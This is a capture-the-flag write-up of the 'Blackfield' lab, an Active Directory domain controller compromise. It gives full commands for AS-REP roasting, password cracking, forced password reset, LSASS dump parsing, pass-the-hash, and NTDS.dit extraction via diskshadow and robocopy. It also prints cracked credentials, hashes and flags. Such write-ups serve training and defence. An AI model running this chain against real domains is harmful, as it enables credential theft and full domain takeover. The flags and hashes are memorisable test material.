
## CTF Writeup: Blackfield

---
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.229.17 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 14:46 -0500
Nmap scan report for 10.129.229.17
Host is up (0.020s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 116.81 seconds
```

Another more detailled scan revealed the provided services.

```
nmap -n -Pn -sSCV -p 53,88,135,389,445,593,3268,5985 10.129.229.17
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 14:51 -0500
Nmap scan report for 10.129.229.17
Host is up (0.017s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-22 02:51:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-22T02:51:54
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.47 seconds
```

The target seems to be an Domain Controller & the nmap scan revealed a lot of information about the domain itself "BLACKFIELD.local", the DC Hostname "DC01" & the FQDN "DC01.BLACKFIELD.local".

Mapped all of information to the target ip in our local dns file.

```
echo "10.129.229.17 BLACKFIELD.local DC01.BLACKFIELD.local DC01" | tee -a /etc/hosts
```

Guest user seems to not be disabled.

```
nxc smb BLACKFIELD.local -u 'guest' -p '' --shares
```

Upon enumerating shares there's 2 non-default SMB Shares. "forensic" & "profiles$" we only have read permissions.

Before I will enumerate the SMB Share itself I'll start with enumerating domain users.

```
nxc smb BLACKFIELD.local -u 'guest' -p '' --rid-brute > newusers.txt
```

Formatted user wordlists.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

I inspected the SMB Share "profiles$".

```
smbclient \\\\blackfield.local/profiles$ -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \>
```

There seemed to be a lot of unknown user shares including support, audit2020 and svc_backup accounts. But those weren't writable and there was no real content inside of all the shares. I moved on with trying to ASREP-Roast.

Performed ASREP-Roasting and found hash for user "support" and stored it inside an file on my local machine.

```
impacket-GetNPUsers -dc-ip 10.129.229.17 blackfield.local/ -usersfile ../creds/users.txt -no-pass
```

Successfully bruteforced an password out of the hash.

```
john support --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:25 DONE (2026-07-21 15:29) 0.03910g/s 560616p/s 560616c/s 560616C/s #1WIF3Y..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
support:#00^BlackKnight
```

Since I wasn't able to find anything interesting on LDAP or RPC I moved onto bloodhound.

Downloaded domain information. Kerberos auth was forced and failed of course & Clock Skew was in-place
```
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.129.229.17 -d blackfield.local -c all
```

I tried to fix clock skew, but it still gave me the same error output after. I downloaded most of the domain information though.

```
ntpdate -s blackfield.local
```

Started up bloodhound on my local machine

```
neo4j console
bloodhound
```

I tried spraying all users with there username as password.

```
nxc smb blackfield.local -u users.txt -p users.txt --continue-on-success
```

Uploaded the domain information inside bloodhound, marker user support as owned and found an very interesting Outbound Object Control / Policy in-place. I'm able to "ForceChangePassword" for user "audit2020".

I therefore utilized the tool rpcclient and connected to the target.

```
rpcclient -U "support%#00^BlackKnight" blackfield.local
rpcclient $>
```

Inside the rpcclient instance I prompted the following command:

```
setuserinfo2 audit2020 23 password123!
```

We now have valid credentials for the user "audit2020".

```
audit2020:password123!
```

I marked this owner as owned in bloodhound. Unfortunately I wasn't able to find anything. So I checked his SMB Share Permissions and found out he has read permissions to the "forensic" SMB Share! Let's check it out.

```
nxc smb blackfield.local -u audit2020 -p 'password123!' --shares
```

I downloaded all SMB Shares onto my local machine and found out interesting information about an potential breach/hacker attack on the active directory network. Including information about an existing user named "Ipwn3dYouCompany". Let's add him to our users.txt wordlist.

```
recurse ON
prompt OFF
mget *
```

I inspected the "memory_analysis" and found an interesting .zip file called "lsass.zip". Could there really be the memory of the windows auth process inside? Yes it does! We now have the "lsass.dmp" file. Let's utilize mimikatz to dump hashes or logon passwords.

Utilized "pypykatz" to dump the memory file.

```
pypykatz lsa minidump lsass.DMP
```

I saved all the LM Hashes inside an hashes.txt wordlist in order to nxc spray.

```
nxc winrm blackfield.local -u users.txt -H hashes.txt --continue-on-success
```

Finally I got an connection to the target Domain Controller using an service account!

```
evil-winrm -i blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

Retrieved user.txt in C:\Users\svc_backup\Desktop.

```
3920bb317a0bef51027e2852be64b543
```
## Privilege Escalation

I enumerated privileges of the service account and he seems to be part of the Backup Operators Group and SeBackupPrivilege.

First of all I tried extracting the SAM & SYSTEM Hive out of the registry.

```
reg save hklm\sam C:\Temp\SAM
```

```
reg save hklm\system C:\Temp\SYSTEM
```

Downloaded the SAM & SYSTEM File onto my local machine. 

```
download SAM
download SYSTEM
```

Dumped SAM & System file but couldnt login with Admin Hash.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
```

I'm assuming we'll need the Domain Hashes of the Administrator Account to authenticate! Which we can get by extracting NTDS.dit (Active Directory Database File). We'll need to do an shadowcopy Attack for this, since the Database File can't be extracted since it's being used 24/7 by the DC.

I will start with creating an script.txt on my local machine:

```
set verbose on  
set metadata C:\Windows\Temp\test.cab  
set context persistent  
add volume C: alias cdrive  
create  
expose %cdrive% E:
```

Since Linux uses LF line endings and windows uses CRLF. We'll need to modify the script with another command in order to eliminate any errors.

```
unix2dos script.txt
```

We can now upload the script to the target.

```
upload script.txt
```

I then ran the windows in-built utility diskshadow.exe which allows me to create an copy of the C:\ Drive.

```
diskshadow /s script.txt
```

We can confirm if it worked.

```
dir E:\
```

To copy the NTDS.dit file we will utilize the windows in-built tool called "robocopy", because it is saver for big files.

```
robocopy /b E:\Windows\ntds . ntds.dit
```

This ensures that the Active Directory Database File is in our current Drive & Directory.

I then downloaded the file to my local machine.

```
download ntds.dit
```

Extracting SYSTEM hive out of the registry.

```
reg save hklm\system C:\Temp\SYSTEM
```

Downloading the hive onto my local machin.

```
download SYSTEM
```

Utilized secretsdump.py in order to dump all domain hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit local
```

I utilized the LM Hash and evil-winrm in order to connect to DC01 as Administrator.

```
evil-winrm -i blackfield.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
4375a629c7c67c8e29db269060c955cb
```